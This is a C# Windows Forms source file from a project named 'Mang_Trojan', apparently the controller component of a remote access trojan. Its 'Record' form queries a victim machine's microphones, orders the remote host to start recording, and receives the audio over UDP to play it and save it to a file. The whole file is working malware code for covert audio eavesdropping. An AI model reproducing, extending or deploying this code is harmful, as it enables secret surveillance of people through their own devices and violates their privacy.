using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using LumiSoft.Net.UDP;
using LumiSoft.Net.Codec;
using LumiSoft.Media.Wave;
using System.Net;
using System.IO;

namespace Mang_Trojan.form
{
    public partial class Record : Form
    {
        private bool m_IsRunning = false;
        private UdpServer m_pUdpServer = null;
        private WaveOut m_pWaveOut = null;
        private int m_Codec = 0;
        private FileStream m_pRecordStream = null;
        private IPEndPoint m_pTargetEP = null;
        string serverIpAdd;
        RemoteObject.ScreenObject hostInstance;
        public Record(string serverIp,RemoteObject.ScreenObject host)
        {
            InitializeComponent();
            this.serverIpAdd = serverIp;
            this.hostInstance = host;
        }

        private void Record_Load(object sender, EventArgs e)
        {
            LoadResource();
            LoadWaveDevices();

            List<string> serverinputdevices = hostInstance.getWavInputDevices();
            cbServerInputDevices.Items.Clear();
            foreach (string device in serverinputdevices)
            {
                cbServerInputDevices.Items.Add(device);
            }
            if (cbServerInputDevices.Items.Count > 0)
            {
                cbServerInputDevices.SelectedIndex = 0;
            }
        }

        #region method LoadWaveDevices

        /// <summary>
        /// Loads available wave input and output devices to UI.
        /// </summary>
        private void LoadWaveDevices()
        {

            // Load output devices.
            m_pOutDevices.Items.Clear();
            foreach (WavOutDevice device in WaveOut.Devices)
            {
                m_pOutDevices.Items.Add(device.Name);
            }
            if (m_pOutDevices.Items.Count > 0)
            {
                m_pOutDevices.SelectedIndex = 0;
            }
        }

        #endregion

        #region LoadInIt
        public void LoadResource()
        {
            //
            m_pLocalPort.Minimum = 1;
            m_pLocalPort.Maximum = 99999;
            m_pLocalPort.Value = 11001;

            //
           
            foreach (IPAddress ip in System.Net.Dns.GetHostAddresses(""))
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    m_pLoacalIP.Items.Add(ip.ToString());
                }
            }
            m_pLoacalIP.SelectedIndex = 0;


            //
            m_pCodec.Items.Add("G711 a-law");
            m_pCodec.Items.Add("G711 u-law");
            m_pCodec.SelectedIndex = 0;

            //

        }
        #endregion

        private void btStartServer_Click(object sender, EventArgs e)
        {
            if (btStartServer.Text.ToUpper() == "BẮT ĐẦU")
            {
                m_Codec = m_pCodec.SelectedIndex;
                hostInstance.startRecordServer(m_Codec, serverIpAdd, 11000, m_pLoacalIP.Text, int.Parse(m_pLocalPort.Text), cbServerInputDevices.SelectedIndex);
                btStartServer.Text = "Dừng";
            }
            else if (btStartServer.Text.ToUpper() == "DỪNG")
            {
                hostInstance.StopRecording();
                btStartServer.Text = "Bắt đầu";
            }
            }

        private void m_pRecordFileBrowse_Click(object sender, EventArgs e)
        {
            SaveFileDialog dlg = new SaveFileDialog();
            dlg.FileName = "record.raw";
            if (dlg.ShowDialog(this) == DialogResult.OK)
            {
                m_pRecordFile.Text = dlg.FileName;
            }

        }

        private void m_pRecord_CheckedChanged(object sender, EventArgs e)
        {
            if (m_pRecord.Checked)
            {
                m_pRecordFile.Enabled = true;
                m_pRecordFileBrowse.Enabled = true;
            }
            else
            {
                m_pRecordFile.Enabled = false;
                m_pRecordFileBrowse.Enabled = false;
            }
        }

        private void m_pToggleRun_Click(object sender, EventArgs e)
        {
            if (m_IsRunning)
            {
                m_IsRunning = false;
              

                m_pUdpServer.Dispose();
                m_pUdpServer = null;

                m_pWaveOut.Dispose();
                m_pWaveOut = null;

                if (m_pRecordStream != null)
                {
                    m_pRecordStream.Dispose();
                    m_pRecordStream = null;
                }

                m_pTimer.Dispose();
                m_pTimer = null;


                m_pToggleRun.Text = "Bắt đầu lắng nghe";
             
            }
            else
            {
                if (m_pOutDevices.SelectedIndex == -1)
                {
                    MessageBox.Show(this, "Bạn hãy chọn thiết bị đầu ra !", "Lỗi:", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (m_pRecord.Checked && m_pRecordFile.Text == "")
                {
                    MessageBox.Show(this, "Bạn hãy chọn tập tin đầu ra !", "Lối:", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (m_pRecord.Checked)
                {
                    m_pRecordStream = File.Create(m_pRecordFile.Text);
                }

                m_IsRunning = true;
                m_pToggleRun.Text = "Dừng lắng nghe";
                m_Codec = m_pCodec.SelectedIndex;

                m_pWaveOut = new WaveOut(WaveOut.Devices[m_pOutDevices.SelectedIndex], 11025, 16, 1);

                m_pUdpServer = new UdpServer();
                m_pUdpServer.Bindings = new IPEndPoint[] { new IPEndPoint(IPAddress.Parse(m_pLoacalIP.Text), (int)m_pLocalPort.Value) };
                m_pUdpServer.PacketReceived += new PacketReceivedHandler(m_pUdpServer_PacketReceived);
                m_pUdpServer.Start();

               

                
                m_pTimer.Enabled = true;

               
               
               
            }
        }

        private void m_pTimer_Tick(object sender, EventArgs e)
        {
            m_pPacketsReceived.Text = m_pUdpServer.PacketsReceived.ToString();
            m_pBytesReceived.Text = m_pUdpServer.BytesReceived.ToString();
        }

        #region method m_pUdpServer_PacketReceived

        /// <summary>
        /// This method is called when we got UDP packet. 
        /// </summary>
        /// <param name="e">Event data.</param>
        private void m_pUdpServer_PacketReceived(UdpPacket_eArgs e)
        {
            // Decompress data.
            byte[] decodedData = null;
            if (m_Codec == 0)
            {
                decodedData = G711.Decode_aLaw(e.Data, 0, e.Data.Length);
            }
            else if (m_Codec == 1)
            {
                decodedData = G711.Decode_uLaw(e.Data, 0, e.Data.Length);
            }

            // We just play received packet.
            m_pWaveOut.Play(decodedData, 0, decodedData.Length);

            // Record if recoring enabled.
            if (m_pRecordStream != null)
            {
                m_pRecordStream.Write(decodedData, 0, decodedData.Length);
            }
        }

        #endregion

        private void btPlayFile_Click(object sender, EventArgs e)
        {
            if (m_pRecordFile.Text.Trim().Length != 0)
            {
                PlayTestAudio(m_pRecordFile.Text);
            }
        }

        #region method PlayTestAudio

        /// <summary>
        /// Plays test audio.
        /// </summary>
        private void PlayTestAudio(string filepath)
        {
            try
            {
                using (FileStream fs = File.OpenRead(filepath))
                {
                    byte[] buffer = new byte[400];
                    int readedCount = fs.Read(buffer, 0, buffer.Length);
                    long lastSendTime = DateTime.Now.Ticks;
                    while (readedCount > 0)
                    {
                        // Send and read next.
                        m_pWaveOut.Play(buffer, 0, readedCount);
                        readedCount = fs.Read(buffer, 0, buffer.Length);

                        System.Threading.Thread.Sleep(25);

                        lastSendTime = DateTime.Now.Ticks;
                    }
                }

                
            }
            catch (Exception x)
            {
                MessageBox.Show(null, "Lỗi: " + x.ToString(), "Lỗi:", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion

    }
}
